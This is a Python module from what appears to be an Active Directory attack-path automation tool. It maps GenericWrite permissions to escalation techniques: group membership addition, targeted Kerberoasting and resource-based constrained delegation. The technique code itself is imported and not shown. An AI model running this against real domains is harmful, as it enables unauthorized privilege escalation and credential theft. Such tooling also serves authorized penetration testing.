# strategies/generic_write.py
from dataclasses import dataclass

from .bloodyad_base import BloodyADBase
from .techniques.ldap_techniques import ADTechniquesMixin
from entities.edge_kind import EdgeKind
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from exceptions.hop_failed_error import HopFailedError


@dataclass
class GenericWriteStrategy(ADTechniquesMixin, BloodyADBase):
    _DISPATCH = {
        NodeKind.GROUP: ADTechniquesMixin._do_add_member,
        NodeKind.USER: ADTechniquesMixin._do_targeted_kerberoast,   # or shadow creds later
        NodeKind.COMPUTER: ADTechniquesMixin._do_rbcd,
    }

    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.GENERIC_WRITE

    def exploit(self, creds: dict) -> ExploitResult:
        creds = self._prepare_creds(creds)

        action = self._DISPATCH.get(self.target.kind)
        if action is None:
            raise HopFailedError(
                self.edge,
                f"GenericWrite on {self.target.kind.value} — no known technique yet"
            )

        return action(self, creds)